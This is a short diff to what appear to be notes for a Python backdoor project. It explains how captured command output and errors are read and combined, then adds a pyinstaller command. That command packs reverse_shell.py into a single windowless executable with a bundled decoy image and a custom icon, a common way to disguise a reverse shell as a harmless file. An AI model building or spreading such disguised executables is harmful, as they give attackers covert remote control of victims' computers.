@@ -23,3 +23,6 @@ proc.stdout.read(): Reads everything that the command outputs (standard output).
 proc.stderr.read(): Reads any error messages (standard error).
 +: Combines both outputs into one variable (result), so you can see both the success output and any errors together.
 ------
+
+
+pyinstaller reverse_shell.py --add-data "C:\x\x\Desktop\backdoor-python\poa.jpg;." --onefile --noconsole --icon C:\x\x\Desktop\backdoor-python\poatan.ico
